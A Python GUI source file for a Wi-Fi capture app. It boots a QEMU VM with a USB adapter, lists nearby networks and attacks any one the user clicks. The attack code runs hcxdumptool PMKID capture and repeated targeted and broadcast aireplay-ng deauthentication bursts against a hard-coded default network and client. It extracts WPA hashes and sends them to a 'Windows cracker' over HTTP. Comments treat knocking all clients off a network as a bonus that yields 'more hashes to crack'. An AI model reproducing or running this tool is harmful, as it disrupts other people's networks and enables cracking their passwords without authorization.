#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Mac WiFi Capture App (double-click GUI)
========================================
Pipeline:
  1. on open -> auto-boot QEMU (Alpine qcow2 + custom initramfs + DWA-160 USB)
  2. CONTINUOUSLY scan + show a live Wi-Fi list (SSID/BSSID/Ch/Signal).
     Click a row -> target auto-fills. Double-click a row -> capture it directly.
  3. capture: airodump-ng + aireplay-ng deauth storm on the selected target
  4. hcxpcapngtool -> .22000 hash -> save local ({SSID}_{date}.22000) + POST to Windows
No terminal interaction required (this GUI drives everything).
"""
import tkinter as tk
from tkinter import scrolledtext, ttk
import subprocess
import threading
import time
import json
import re
import urllib.request
import os

# ---------- fixed QEMU / VM paths (on the Mac) ----------
QEMU_BIN    = '/opt/homebrew/bin/qemu-system-aarch64'
QCOW2       = '/tmp/alpine-root.qcow2'
KERNEL      = '/tmp/alpine-boot/boot/vmlinuz-lts'
INITRD      = '/tmp/initramfs-custom'
SERIAL_LOG  = '/tmp/vm_app_serial.log'
MON_SOCK    = '/tmp/vm_app_monitor.sock'
SSH_KEY     = os.path.expanduser('~/.ssh/vm_tongbao')

# DWA-160 USB ids (decimal, as reported by ioreg)
DWA_VENDOR  = '5263'    # 0x148f
DWA_PRODUCT = '21874'   # 0x5572

# ---------- local offline hash store (on the Mac) ----------
# 檔名 = {SSID}_{YYYY-MM-DD}.22000（每個 Wi-Fi 每天一個檔，命名清楚）
LOCAL_DIR   = os.path.expanduser('~/MacCapture/captures')

def local_hash_path(ssid):
    """本機 hash 檔路徑：~/MacCapture/captures/{SSID}_{YYYY-MM-DD}.22000"""
    safe = re.sub(r'[^A-Za-z0-9._-]', '_', ssid.strip()) or 'wifi'
    date = time.strftime('%Y-%m-%d')
    return os.path.join(LOCAL_DIR, '%s_%s.22000' % (safe, date))

def local_hash_files():
    """本機所有 hash 檔（*.22000）的完整路徑列表。"""
    if not os.path.isdir(LOCAL_DIR):
        return []
    return sorted(os.path.join(LOCAL_DIR, f) for f in os.listdir(LOCAL_DIR) if f.endswith('.22000'))

def freq_to_channel(freq):
    """MHz -> channel. 2.4GHz ch1-13; 5GHz ch36+."""
    try:
        f = int(freq)
    except Exception:
        return 0
    if f < 2483:
        return max(1, min(13, round((f - 2407) / 5)))
    return max(36, round((f - 5000) / 5))

# ---------- defaults (32H10F) ----------
DEFAULTS = {
    'ssid':       '32H10F',
    'bssid':      'BC:3E:07:01:DC:98',
    'channel':    '1',
    'client':     'BC:61:93:23:BC:3F',
    'duration':   '300',            # capture window in seconds
    'windows_ip': '192.168.1.107',
    'port':       '8766',
}
VM_SSH = ('ssh -i %s -p 2222 -o ConnectTimeout=20 -o StrictHostKeyChecking=no '
          '-o BatchMode=yes root@127.0.0.1' % SSH_KEY)


class MacCaptureApp:
    def __init__(self, root, autostart=True):
        self.root = root
        root.title('Mac WiFi Capture  (DWA-160  →  即時 Wi-Fi 列表)')
        root.geometry('880x680')
        self.var = {}
        # scan-loop state
        self._scan_paused = threading.Event()   # set => scan paused (capture running)
        self._scan_stop   = threading.Event()   # set => stop the scan loop
        self._autostart   = autostart

        # ===== row 0: status bar (USB + scan status) =====
        status = tk.Frame(root)
        status.grid(row=0, column=0, columnspan=2, sticky='ew', padx=10, pady=(8, 2))
        self.usb_label = tk.Label(status, text='🔌 USB DWA-160: 🔍 檢查中...', fg='#555555')
        self.usb_label.pack(side='left')
        tk.Button(status, text='🔍 檢查', command=self.on_check_usb).pack(side='left', padx=8)
        self.scan_status = tk.Label(status, text='📡 開機中（VM 啟動 ~95s）...', fg='#0066cc', font=('', 10, 'bold'))
        self.scan_status.pack(side='left', padx=8)

        # ===== row 1: live Wi-Fi list (Treeview + scrollbar), expandable =====
        tree_frame = tk.Frame(root)
        tree_frame.grid(row=1, column=0, columnspan=2, sticky='nsew', padx=10, pady=4)
        self.tree = ttk.Treeview(tree_frame,
                                 columns=('ssid', 'bssid', 'ch', 'sig'),
                                 show='headings', height=14, selectmode='browse')
        self.tree.heading('ssid',  text='SSID')
        self.tree.heading('bssid', text='BSSID')
        self.tree.heading('ch',    text='Ch')
        self.tree.heading('sig',   text='Signal')
        self.tree.column('ssid',  width=190, anchor='w')
        self.tree.column('bssid', width=150, anchor='w')
        self.tree.column('ch',    width=50,  anchor='center')
        self.tree.column('sig',   width=90,  anchor='center')
        sb = ttk.Scrollbar(tree_frame, orient='vertical', command=self.tree.yview)
        self.tree.configure(yscrollcommand=sb.set)
        self.tree.pack(side='left', fill='both', expand=True)
        sb.pack(side='right', fill='y')
        self.tree.bind('<Button-1>', self.on_tree_click)
        self.tree.bind('<Double-1>', self.on_tree_dclick)

        # ===== row 2: target fields (auto-fill from a selected row) =====
        tf = tk.Frame(root)
        tf.grid(row=2, column=0, columnspan=2, sticky='ew', padx=10, pady=2)
        tf.columnconfigure(1, weight=1)
        tf.columnconfigure(3, weight=1)

        def field(key, label, col, row, width=26):
            self.var[key] = tk.StringVar(value=DEFAULTS[key])
            tk.Label(tf, text=label).grid(row=row, column=col, sticky='e', padx=(4, 4), pady=2)
            tk.Entry(tf, textvariable=self.var[key], width=width).grid(
                row=row, column=col + 1, sticky='ew', pady=2, padx=(0, 12))

        field('ssid',    'SSID',         0, 0)
        field('client',  'Client MAC (deauth)', 2, 0, width=22)
        field('bssid',   'BSSID',        0, 1)
        field('duration','Capture 秒數', 2, 1, width=10)
        field('channel', 'Channel',      0, 2, width=8)
        field('windows_ip', 'Windows IP', 2, 2, width=18)
        self.var['port'] = tk.StringVar(value=DEFAULTS['port'])
        tk.Label(tf, text='Port').grid(row=3, column=2, sticky='e', padx=(4, 4), pady=2)
        tk.Entry(tf, textvariable=self.var['port'], width=10).grid(row=3, column=3, sticky='ew', pady=2, padx=(0, 12))

        # ===== row 3: buttons =====
        bf = tk.Frame(root)
        bf.grid(row=3, column=0, columnspan=2, sticky='ew', padx=10, pady=8)
        self.btn = tk.Button(bf, text='▶  開始抓包（選中的 Wi-Fi）', command=self.start, font=('', 12, 'bold'))
        self.btn.pack(side='left', padx=(0, 10))
        self.btn_scan = tk.Button(bf, text='⏸ 暫停掃描', command=self.on_toggle_scan)
        self.btn_scan.pack(side='left', padx=6)
        tk.Button(bf, text='🔄 重送本機 hash', command=self.resend).pack(side='left', padx=6)
        self.var['resend_file'] = tk.StringVar()
        self.resend_combo = ttk.Combobox(bf, textvariable=self.var['resend_file'],
                                         state='readonly', width=28)
        self.resend_combo.pack(side='left', padx=6)
        self._refresh_resend_combo()

        # ===== row 4/5: log =====
        tk.Label(root, text='Log', font=('', 11, 'bold')).grid(
            row=4, column=0, columnspan=2, sticky='w', padx=12)
        self.log = scrolledtext.ScrolledText(root, height=12, width=96)
        self.log.grid(row=5, column=0, columnspan=2, padx=10, pady=6)

        root.grid_columnconfigure(0, weight=1)
        root.grid_rowconfigure(1, weight=1)

        self.logline('就緒。DWA-160 要插在 Mac；開機後會自動掃 Wi-Fi，點一列即選、雙擊直接抓。')
        _files = local_hash_files()
        if _files:
            self.logline('💾 本機 hash 檔（%s）：' % LOCAL_DIR)
            for _fp in _files:
                try:
                    with open(_fp) as _f:
                        _n = sum(1 for _line in _f if _line.strip())
                    self.logline('   %s  (%d hash)' % (os.path.basename(_fp), _n))
                except Exception:
                    self.logline('   %s' % os.path.basename(_fp))
        else:
            self.logline('💾 本機還沒存過 hash（%s）' % LOCAL_DIR)

        if autostart:
            threading.Thread(target=self._startup, daemon=True).start()

    # ---------- logging (thread-safe) ----------
    def logline(self, msg):
        def _append():
            self.log.insert('end', msg + '\n')
            self.log.see('end')
            self.root.update_idletasks()
        try:
            self.root.after(0, _append)
        except Exception:
            pass

    def _set_scan_status(self, text, color='#0066cc'):
        def _do():
            self.scan_status.config(text='📡 ' + text, fg=color)
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    def set_usb_status(self, found):
        def _do():
            if found:
                self.usb_label.config(text='🔌 USB DWA-160: ✅ 已偵測 (0x148f:0x5572)', fg='#1a7f1a')
            else:
                self.usb_label.config(text='🔌 USB DWA-160: ❌ 沒偵測到（要插在 Mac）', fg='#b02020')
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    # ---------- USB detection ----------
    def check_usb(self):
        """DWA-160 present? ioreg (system_profiler returns 0 bytes on some macOS)."""
        try:
            r = subprocess.run('ioreg -r -c IOUSBHostDevice', shell=True,
                               capture_output=True, timeout=30)
            out = (r.stdout or b'').decode('utf-8', 'replace')
            found = ('idVendor" = %s' % DWA_VENDOR in out) and \
                    ('idProduct" = %s' % DWA_PRODUCT in out)
            if not found:
                r2 = subprocess.run('system_profiler SPUSBDataType', shell=True,
                                    capture_output=True, timeout=30)
                out2 = (r2.stdout or b'').decode('utf-8', 'replace').lower()
                found = ('148f' in out2) and ('5572' in out2)
            return found
        except Exception:
            return False

    def on_check_usb(self):
        self.usb_label.config(text='🔌 USB DWA-160: 🔍 檢查中...', fg='#555555')
        def _chk():
            found = self.check_usb()
            self.set_usb_status(found)
            self.logline('   🔍 USB 檢查: %s' % ('✅ DWA-160 已偵測' if found else '❌ 沒偵測到 DWA-160'))
        threading.Thread(target=_chk, daemon=True).start()

    # ---------- VM boot / ready ----------
    def vm_ready(self):
        """wlan0 exists + firmware loaded (rt2870.bin)."""
        try:
            r = subprocess.run(
                VM_SSH + ' "iw dev 2>/dev/null; echo ---DMESG---; dmesg 2>/dev/null | grep -i \'Firmware detected\' | tail -1"',
                shell=True, capture_output=True, timeout=25)
            out = (r.stdout or b'').decode('utf-8', 'replace')
            return ('wlan0' in out) and ('Firmware detected' in out)
        except Exception:
            return False

    def boot_vm(self):
        missing = [f for f in (QEMU_BIN, QCOW2, KERNEL, INITRD, SSH_KEY) if not os.path.exists(f)]
        if missing:
            for f in missing:
                self.logline('❌ MISSING: %s' % f)
            self.logline('   /tmp 可能被清掉了 → 重新 build VM。')
            return False
        self.logline('   關閉既有 QEMU ...')
        subprocess.run(['pkill', '-f', 'qemu-system-aarch64'], capture_output=True)
        time.sleep(2)
        self.logline('   啟動 QEMU (qcow2 + custom initramfs + DWA-160) ...')
        os.system('rm -f %s %s' % (SERIAL_LOG, MON_SOCK))
        cmd = ('%s -machine virt -cpu cortex-a72 -m 4096 -smp 4 '
               '-drive file=%s,format=qcow2 '
               '-kernel %s -initrd %s -append "console=ttyAMA0" '
               '-chardev file,id=s0,path=%s,append=on -serial chardev:s0 '
               '-netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 '
               '-device virtio-net-pci,netdev=n0 '
               '-device qemu-xhci,id=xhci '
               '-device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572 '
               '-display none -monitor unix:%s,server,nowait'
               % (QEMU_BIN, QCOW2, KERNEL, INITRD, SERIAL_LOG, MON_SOCK))
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.logline('   等 95s 開機 + firmware load (rt2870.bin 延遲 ~64-80s) ...')
        time.sleep(95)
        self.logline('   等 wlan0 + firmware ready ...')
        for _ in range(40):
            if self.vm_ready():
                self.logline('   ✅ VM 就緒 (wlan0 + firmware)。')
                return True
            time.sleep(3)
        self.logline('   ⚠️ VM 就緒檢查逾時（繼續嘗試）。')
        return True

    # ---------- continuous scan ----------
    def _startup(self):
        self.logline('=== 開機：自動啟動 VM + 持續掃描 Wi-Fi ===')
        self.on_check_usb()
        if self.boot_vm():
            self._set_scan_status('持續掃描中…', '#1a7f1a')
            self._scan_loop()
        else:
            self._set_scan_status('VM 開機失敗', '#b02020')

    def _scan_loop(self):
        while not self._scan_stop.is_set():
            if self._scan_paused.is_set():
                time.sleep(1)
                continue
            self._set_scan_status('掃描中…', '#b08000')
            aps = self.do_scan()
            if aps:
                self._update_tree(aps)
                self._set_scan_status('上次 %s · %d 個 AP · 點一列即選' % (
                    time.strftime('%H:%M:%S'), len(aps)), '#1a7f1a')
            else:
                self._set_scan_status('掃描中…（還沒掃到 AP）', '#b08000')
            for _ in range(5):
                if self._scan_stop.is_set():
                    break
                time.sleep(1)

    def do_scan(self):
        script = ('iw dev wlan0 set type monitor 2>/dev/null\n'
                  'ifconfig wlan0 up 2>/dev/null\n'
                  'sleep 1\n'
                  'timeout 20 iw dev wlan0 scan 2>&1\n')
        try:
            r = subprocess.run(VM_SSH + ' "sh -s"', input=script.encode(),
                               capture_output=True, timeout=50, shell=True)
            out = (r.stdout or b'').decode('utf-8', 'replace')
            return self.parse_scan(out)
        except Exception as e:
            self._set_scan_status('scan 失敗: %s' % e, '#b02020')
            return []

    @staticmethod
    def parse_scan(out):
        aps, order, cur = {}, [], None
        for raw in out.splitlines():
            ls = raw.strip()
            if ls.startswith('BSS '):
                parts = ls.split()
                if len(parts) >= 2:
                    cur = parts[1].lower()
                    if cur not in aps:
                        aps[cur] = {'ssid': '', 'ch': 0, 'sig': ''}
                        order.append(cur)
            elif ls.startswith('Signal:') and cur:
                toks = ls.split(':', 1)[1].split()
                if toks:
                    aps[cur]['sig'] = toks[0]
            elif ls.startswith('freq:') and cur:
                try:
                    f = int(ls.split(':', 1)[1].split()[0])
                    aps[cur]['ch'] = freq_to_channel(f)
                except Exception:
                    pass
            elif ls.startswith('SSID:') and cur:
                aps[cur]['ssid'] = ls.split(':', 1)[1].strip()
        result = []
        for b in order:
            a = aps[b]
            result.append((a['ssid'] or '(hidden)', b.upper(), str(a['ch']), a['sig']))
        def sigval(x):
            try:
                return float(x[3])
            except Exception:
                return 999.0
        result.sort(key=sigval)  # strongest (most negative dBm) first
        return result

    def _update_tree(self, aps):
        def _do():
            self.tree.delete(*self.tree.get_children())
            for ssid, bssid, ch, sig in aps:
                self.tree.insert('', 'end', values=(ssid, bssid, ch, sig))
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    # ---------- tree interactions ----------
    def on_tree_click(self, event):
        sel = self.tree.selection()
        if not sel:
            return
        vals = self.tree.item(sel[0])['values']
        if len(vals) >= 3:
            ssid, bssid, ch = vals[0], vals[1], str(vals[2])
            self.var['ssid'].set(ssid)
            self.var['bssid'].set(bssid)
            if ch and ch != '0':
                self.var['channel'].set(ch)
            self.logline('🎯 已選目標: %s / %s / ch%s（雙擊該列可直接抓包）' % (ssid, bssid, ch))

    def on_tree_dclick(self, event):
        self.on_tree_click(event)
        self.start()

    def on_toggle_scan(self):
        if self._scan_paused.is_set():
            self._scan_paused.clear()
            self.btn_scan.config(text='⏸ 暫停掃描')
            self.logline('▶ 繼續掃描 Wi-Fi')
        else:
            self._scan_paused.set()
            self.btn_scan.config(text='▶ 繼續掃描')
            self.logline('⏸ 暫停掃描')

    # ---------- local store / post ----------
    def save_local(self, ssid, hash_lines):
        try:
            os.makedirs(LOCAL_DIR, exist_ok=True)
            path = local_hash_path(ssid)
            existing = set()
            if os.path.exists(path):
                with open(path) as f:
                    existing = set(line.strip() for line in f if line.strip())
            new = [h for h in hash_lines if h not in existing]
            if new:
                with open(path, 'a') as f:
                    for h in new:
                        f.write(h + '\n')
            self.logline('   💾 本機已存 %d 個 hash（新增 %d）→ %s' % (
                len(existing) + len(new), len(new), path))
            self._refresh_resend_combo()
            return len(new)
        except Exception as e:
            self.logline('   ⚠️ 存本機失敗: %r' % e)
            return 0

    def post_hashes(self, hashes, ssid, bssid, wip, port):
        posted = 0
        for i, h in enumerate(hashes):
            payload = {'hash': h, 'ssid': ssid, 'bssid': bssid.lower()}
            try:
                req = urllib.request.Request(
                    'http://%s:%s/api/receive-hash' % (wip, port),
                    data=json.dumps(payload).encode(),
                    headers={'Content-Type': 'application/json'}, method='POST')
                resp = urllib.request.urlopen(req, timeout=15)
                body = resp.read().decode('utf-8', 'replace')
                self.logline('   POST OK: %s' % body[:120])
                posted += 1
            except Exception as e:
                self.logline('   POST FAIL (hash %d/%d): %s' % (i + 1, len(hashes), e))
                if i == 0:
                    self.logline('   → Windows cracker 可能沒開。hash 已存本機，開起來後按「🔄 重送本機 hash」。')
                    break
        return posted

    def _refresh_resend_combo(self):
        files = local_hash_files()
        names = ['(全部本機 hash)'] + [os.path.basename(f) for f in files]
        current = self.var['resend_file'].get() if 'resend_file' in self.var else ''
        self.resend_combo['values'] = names
        if current and current in names:
            self.var['resend_file'].set(current)
        else:
            self.var['resend_file'].set(names[0])

    def resend(self):
        wip = self.var['windows_ip'].get().strip()
        port = self.var['port'].get().strip()
        chosen = self.var['resend_file'].get()
        files = local_hash_files()
        if chosen and chosen != '(全部本機 hash)':
            files = [f for f in files if os.path.basename(f) == chosen]
        if not files:
            self.logline('📭 沒有要重送的 hash 檔')
            return
        all_hashes = []
        for fp in files:
            try:
                with open(fp) as f:
                    for line in f:
                        if line.strip():
                            all_hashes.append(line.strip())
            except Exception as e:
                self.logline('   ⚠️ 讀 %s 失敗: %r' % (os.path.basename(fp), e))
        seen, uniq = set(), []
        for h in all_hashes:
            if h not in seen:
                seen.add(h)
                uniq.append(h)
        if not uniq:
            self.logline('📭 hash 檔全是空的')
            return
        ssid = self.var['ssid'].get().strip()
        bssid = self.var['bssid'].get().strip().upper()
        self.logline('🔄 重送 %d 個 hash（%s）到 %s:%s ...' % (len(uniq), chosen, wip, port))
        posted = self.post_hashes(uniq, ssid, bssid, wip, port)
        self.logline('   重送完成 %d/%d。%s' % (
            posted, len(uniq),
            '' if posted == len(uniq) else '（沒送完的還在 Mac 本機，Windows 開起來再按重送）'))

    # ---------- capture ----------
    def start(self):
        if str(self.btn.cget('state')) == 'disabled':
            self.logline('（抓包進行中，先等一下）')
            return
        self.btn.config(state='disabled')
        threading.Thread(target=self.run, daemon=True).start()

    def run(self):
        self._scan_paused.set()  # pause scan while capturing (shared wlan0)
        try:
            ssid   = self.var['ssid'].get().strip()
            bssid  = self.var['bssid'].get().strip().upper()
            ch     = self.var['channel'].get().strip()
            client = self.var['client'].get().strip().upper()
            dur    = int(self.var['duration'].get().strip() or '300')
            wip    = self.var['windows_ip'].get().strip()
            port   = self.var['port'].get().strip()
            self.logline('=== Mac WiFi Capture: %s (%s) ch%s, %ss ===' % (ssid, bssid, ch, dur))

            missing = [f for f in (QEMU_BIN, QCOW2, KERNEL, INITRD, SSH_KEY) if not os.path.exists(f)]
            if missing:
                for f in missing:
                    self.logline('❌ MISSING: %s' % f)
                self.logline('   /tmp 可能被清掉了 → 重新 build VM。')
                return

            if self.vm_ready():
                self.logline('[1/5] VM 已就緒（沿用掃掠開好的 VM，跳過 95s 開機）')
            else:
                self.logline('[1/5] 啟動 VM ...')
                self.boot_vm()

            self.logline('[2/5] SSH 進 VM，開抓包 (monitor + airodump + deauth storm %ss) ...' % dur)
            vm_script = (
                'set +e\n'
                # shell vars keep the % (bssid, client, dur, ch) order stable
                'BSSID=%s\n'
                'CLIENT=%s\n'
                'DUR=%s\n'
                'CH=%s\n'
                'rm -f /tmp/capapp* /tmp/appairodump.log /tmp/appdeauth.log /tmp/airodump.log /tmp/deauth.log 2>/dev/null\n'
                'rm -f /tmp/capfull* /tmp/captest* /tmp/par* /tmp/fg* /tmp/dbg* /tmp/alone* /tmp/mix* /tmp/fresh* 2>/dev/null\n'
                'i=0\n'
                'while [ $i -lt 40 ]; do\n'
                '  if iw dev 2>/dev/null | grep -q wlan0 && dmesg 2>/dev/null | grep -q "Firmware detected"; then break; fi\n'
                '  sleep 3; i=$((i+1))\n'
                'done\n'
                # monitor mode: must DOWN the iface first or "Resource busy"
                'ifconfig wlan0 down 2>/dev/null\n'
                'iw dev wlan0 set type monitor 2>/dev/null\n'
                'ifconfig wlan0 up 2>&1\n'
                'sleep 2\n'
                'pkill -9 -f "airodump-ng|aireplay-ng|hcxdumptool" 2>/dev/null\n'
                'sleep 1\n'
                'rm -f /tmp/capapp* /tmp/hcx*.pcapng /tmp/hcx.log 2>/dev/null\n'
                # PHASE 1: hcxdumptool --active_scan (reliable PMKID capture). The
                # sticky 32H10F client uses PMKSA caching, so deauthing it makes it
                # fast-reassociate WITHOUT an EAPOL 4-way. hcxdumptool active-scan
                # makes the AP answer a probe and re-broadcast its PMKID, which
                # hcxpcapngtool extracts -- no client needed. Guarded: skipped if
                # hcxdumptool is not installed in the VM.
                'HCDUR=$(( DUR * 40 / 100 )); [ $HCDUR -lt 20 ] && HCDUR=20\n'
                'ADUR=$(( DUR - HCDUR )); [ $ADUR -lt 10 ] && ADUR=10\n'
                'if command -v hcxdumptool >/dev/null 2>&1; then\n'
                '  echo "PHASE1: hcxdumptool --active_scan (PMKID) ${HCDUR}s ch $CH"\n'
                '  timeout $HCDUR hcxdumptool -i wlan0 --active_scan --filtermac=$BSSID -c $CH -o /tmp/hcx.pcapng > /tmp/hcx.log 2>&1; tail -6 /tmp/hcx.log\n'
                'else\n'
                '  echo "PHASE1: hcxdumptool not in VM -> airodump only"\n'
                'fi\n'
                # deauth: SPACED-OUT bursts (targeted + broadcast, every 45s), NOT a
                # continuous storm. A continuous storm keeps a "sticky" client
                # (one that ACKs deauths but backs off for a long time) from ever
                # reassociating. Spacing the bursts 45s apart gives the client a
                # real window to reassociate after each burst; the continuous
                # airodump below then captures the (re)association frame, which
                # carries the PMKID even when the client uses the PMKSA cache
                # (no full EAPOL 4-way handshake needed).
                #
                # KEY FIX for the sticky 32H9F_5G client (bc:61:93:23:bc:3f) that
                # ACKs a *targeted* deauth but never reassociates: also send a
                # *broadcast* deauth from the AP (deauths ALL clients). That drops
                # the sticky client wholesale -> it does a full (re)auth and emits
                # a (Re)Assoc frame carrying the PMKID (and any EAPOL handshake).
                # bg subshell, all fds -> /dev/null so it never holds the SSH pipe;
                # killed by PID on exit.
                '( END=$(( $(date +%%s) + ADUR )); while [ $(date +%%s) -lt $END ]; do\n'
                '  # targeted deauth (AP -> client): make the client think the AP dropped it\n'
                '  aireplay-ng --deauth 12 --ignore-negative-one -a $BSSID -c $CLIENT wlan0 < /dev/null > /dev/null 2>&1\n'
                '  # BROADCAST deauth (AP -> all clients): the key fix for "sticky" clients that\n'
                '  # ACK a targeted deauth but never reassociate. Deauthing the AP wholesale\n'
                '  # forces the client to do a full (re)auth -> (Re)Assoc frame carries the PMKID\n'
                '  # (works even with a PMKSA cache) and lets us catch any EAPOL 4-way handshake.\n'
                '  # Bonus: other clients also re-handshake -> more hashes to crack.\n'
                '  aireplay-ng --deauth 6 --ignore-negative-one -a $BSSID wlan0 < /dev/null > /dev/null 2>&1\n'
                '  sleep 45\n'
                'done ) < /dev/null &\n'
                'DEAUTH_PID=$!\n'
                'sleep 3\n'
                # airodump: continuous capture for the duration (foreground).
                # SIGTERM (timeout) flushes the cap fine once monitor mode is set
                # correctly. Repeat nruns x 10s.
                'nruns=$(( ADUR / 10 )); [ $nruns -lt 1 ] && nruns=1; [ $nruns -gt 60 ] && nruns=60\n'
                'for i in $(seq 1 $nruns); do\n'
                '  timeout 10 airodump-ng -w /tmp/capapp -c $CH wlan0 > /dev/null 2>&1\n'
                'done\n'
                'kill -9 $DEAUTH_PID 2>/dev/null\n'
                'pkill -9 aireplay-ng 2>/dev/null\n'
                'echo "CAP_COUNT:"; ls /tmp/capapp-*.cap 2>/dev/null | wc -l\n'
                'echo "CAP_TOTAL:"; du -sch /tmp/capapp-*.cap 2>/dev/null | tail -1\n'
                'HFILES=""; [ -f /tmp/hcx.pcapng ] && HFILES="/tmp/hcx.pcapng"\n'
                'for f in /tmp/capapp-*.cap; do [ -f "$f" ] && HFILES="$HFILES $f"; done\n'
                'echo "HXCAP_FILES:$HFILES"\n'
                'hcxpcapngtool -o /tmp/capapp.22000 $HFILES 2>&1 | tail -4\n'
                'exec 0</dev/null 2>/dev/null\n'
                'echo "===HASH==="\n'
                'cat /tmp/capapp.22000 2>/dev/null\n'
                'echo "===END==="\n'
                'wc -l /tmp/capapp.22000 2>/dev/null\n'
                % (bssid, client, dur, ch)
            )
            r = subprocess.run(VM_SSH + ' "sh -s"', input=vm_script.encode(),
                               capture_output=True, timeout=dur + 200, shell=True)
            out = (r.stdout or b'').decode('utf-8', 'replace') + (r.stderr or b'').decode('utf-8', 'replace')
            for line in out.splitlines():
                if any(k in line for k in ['===HASH===', '===END===', 'WPA', 'PMKID',
                                           'EAPOL', 'hcxpcapngtool', 'hcxdumptool',
                                           'PHASE1', 'HXCAP_FILES', 'packets inside',
                                           'ESSID', 'ioctl', 'Failed', 'CAP_COUNT',
                                           'CAP_TOTAL', 'processed cap files']):
                    self.logline('   ' + line.strip())

            self.logline('[3/5] 解析 hash ...')
            hash_lines, in_hash = [], False
            for line in out.splitlines():
                if '===HASH===' in line:
                    in_hash = True
                    continue
                if '===END===' in line:
                    in_hash = False
                    continue
                if in_hash and line.strip():
                    hash_lines.append(line.strip())
            self.logline('   抓到 %d 行 hash' % len(hash_lines))
            for h in hash_lines:
                self.logline('   HASH: %s' % (h[:64] + ('...' if len(h) > 64 else '')))

            self.logline('[4/5] 存本機 + POST ...')
            if hash_lines:
                self.save_local(ssid, hash_lines)
            else:
                self.logline('   💾 本次 0 hash（本機未新增）')
            posted = self.post_hashes(hash_lines, ssid, bssid, wip, port) if hash_lines else 0

            self.logline('[5/5] 完成。POST 成功 %d/%d。%s' % (
                posted, len(hash_lines),
                '✅ 成功' if posted > 0 else '⚠️ 0 hash（PMKSA timing → 重跑或加大 capture 秒數）'))
            self.logline('=== 結束 ===')
        except Exception as e:
            self.logline('ERROR: %r' % e)
        finally:
            self.btn.config(state='normal')
            self._scan_paused.clear()  # resume scan

    def on_close(self):
        self._scan_stop.set()
        subprocess.run(['pkill', '-f', 'qemu-system-aarch64'], capture_output=True)
        self.root.destroy()


def main():
    root = tk.Tk()
    app = MacCaptureApp(root)
    root.protocol('WM_DELETE_WINDOW', app.on_close)
    root.mainloop()


if __name__ == '__main__':
    main()
